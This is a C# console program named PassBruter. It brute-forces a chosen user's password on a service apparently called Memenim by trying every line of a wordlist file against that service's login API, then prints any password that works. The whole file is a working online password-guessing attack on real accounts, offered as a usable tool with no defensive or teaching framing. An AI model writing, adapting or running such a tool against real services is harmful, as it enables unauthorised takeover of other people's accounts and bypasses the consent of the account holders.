using Memenim.Core.Api;
using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace PassBruter
{

    class Program
    {
        static private Dictionary<string, string> arguments = new Dictionary<string, string>();

        static private string _FilePath = "passbase.txt";
        static private string _Login = "";
        static private bool _ShowPasswords;

        static void Main(string[] args)
        {
            foreach(var arg in args)
            {
                (string, string) tuple = GetArgTuple(arg);
                arguments.Add(tuple.Item1, tuple.Item2);
            }

            ParseArguments();

            if(string.IsNullOrEmpty(_Login) || string.IsNullOrEmpty(_FilePath))
            {
                Console.WriteLine("Failed to start");
                return;
            }

            string[] passwordsBase = File.ReadAllLines(_FilePath);
            bool foundPass = false;
            int line = 0;
            while (!foundPass)
            {
                if(line >= passwordsBase.Length)
                {
                    break;
                }
                var operation = UserApi.Login(_Login, passwordsBase[line]);
                if(_ShowPasswords)
                {
                    Console.WriteLine(passwordsBase[line]);
                }
                if (!operation.Result.error)
                {
                    Console.WriteLine(String.Format("Pass for {0} found {1}", _Login, passwordsBase[line]));
                }
                ++line;
            }

            Console.ReadLine();
        }


        static void ParseArguments()
        {
            foreach(var arg in arguments)
            {
                switch(arg.Key)
                {
                    case "login":
                        _Login = arg.Value;
                        break;
                    case "passwords":
                        _FilePath = arg.Value;
                        break;
                    case "showPasswords":
                        _ShowPasswords = true;
                        break;
                    default:
                        break;
                }
            }    
        }

        static (string Key, string Value) GetArgTuple(string arg)
        {
            string[] tuple = arg.Split(':');
            if(tuple.Length > 1)
            {
                return (tuple[0], tuple[1]);
            }
            return (tuple[0], "");
        }
    }
}
